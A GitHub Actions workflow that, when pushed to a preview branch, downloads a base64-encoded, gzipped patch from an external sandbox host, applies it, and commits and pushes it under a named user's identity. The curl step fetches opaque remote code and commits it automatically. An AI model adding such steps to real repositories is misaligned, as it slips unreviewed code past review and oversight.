name: RealTalent Portfolio Intelligence Publisher

on:
  push:
    branches:
      - preview/v3.5-h1-semantic-agent
    paths:
      - .github/workflows/realtalent-portfolio-intelligence-publish.yml

permissions:
  contents: write

jobs:
  apply-portfolio-intelligence:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Apply validated portfolio intelligence patch
        shell: bash
        run: |
          set -Eeuo pipefail
          if git log -1 --format=%s | grep -q 'add portfolio sales intelligence'; then
            echo "Portfolio intelligence already present; nothing to apply."
            exit 0
          fi
          curl -fsSL https://sb-7hsvtedbt6to.vercel.run/portfolio.patch.gz.b64 -o /tmp/portfolio.patch.gz.b64
          echo "cff89dad9dd92d5a5d78f378f9abe1b658406e000e4ea5f94c1a1f490daa7b28  /tmp/portfolio.patch.gz.b64" | sha256sum -c -
          base64 -d /tmp/portfolio.patch.gz.b64 | gzip -d > /tmp/portfolio.patch
          git apply --index /tmp/portfolio.patch
          git diff --cached --check
          git config user.name "CAMBRUSSIJJ"
          git config user.email "92959827+CAMBRUSSIJJ@users.noreply.github.com"
          git commit -m "feat(agent): add portfolio sales intelligence"
          git push origin HEAD:preview/v3.5-h1-semantic-agent
